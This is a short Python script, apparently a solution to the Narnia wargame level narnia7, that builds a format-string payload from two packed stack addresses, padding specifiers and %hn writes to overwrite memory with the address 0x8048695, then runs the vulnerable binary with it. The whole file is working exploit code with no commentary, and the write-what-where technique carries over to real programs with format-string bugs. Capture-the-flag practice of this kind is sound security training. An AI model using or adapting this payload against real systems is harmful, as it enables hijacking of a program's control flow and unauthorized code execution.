#!/usr/bin/python
#
#

import os

addr2 = "\x2e\xd6\xff\xff"
addr = "\x2c\xd6\xff\xff"

# 0x8048695

#argv1 = $(python -c'print "\x2e\xd6\xff\xff\x2c\xd6\xff\xff"')%.2044x%6\$hn%.32401x%7\$hn
argv1 = addr2 + addr + "%.2044x" + "%6\$hn" + "%.32401x" + "%7\$hn"

#print "argument is: " + argv1

os.execv("/narnia/narnia7", ["/narnia/narnia7", argv1])


